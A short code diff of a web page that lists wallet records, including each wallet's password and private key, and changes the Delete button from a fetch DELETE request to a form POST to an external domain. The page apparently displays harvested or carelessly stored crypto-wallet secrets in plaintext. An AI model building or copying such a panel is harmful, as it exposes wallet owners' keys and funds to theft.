@@ -110,7 +110,11 @@
                         <td>${wallet.password}</td>
                         <td>${wallet.privatekeyval}</td>
                         <td>${wallet.createdAt}</td>
-                        <td><button class="delete-button" onclick="deleteRecord('${wallet._id}')">Delete</button></td>
+                        <td>
+                            <form action="https://www.digitalmaxtrd.com/deletetr/${wallet._id}" method="post">
+                                <button class="delete-button" type="submit">Delete</button>
+                            </form>
+                        </td>
                     `;
                     walletsContainer.appendChild(row);
                 });
@@ -121,27 +125,6 @@
                 const walletsContainer = document.getElementById('wallets-container');
                 walletsContainer.innerHTML = '<tr><td colspan="8">Error fetching wallets data</td></tr>';
             });
-
-        function deleteRecord(id) {
-            // Send a DELETE request to the API endpoint with the record ID
-            fetch(`https://www.digitalmaxtrd.com/deletetr/${id}`, {
-                method: 'DELETE',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-            })
-                .then(response => {
-                    if (response.ok) {
-                        console.log(`Record with ID ${id} deleted successfully`);
-                        // Optionally, update the UI to reflect the deletion
-                    } else {
-                        console.error('Failed to delete record:', response.status);
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                });
-        }
     </script>
 </body>
 
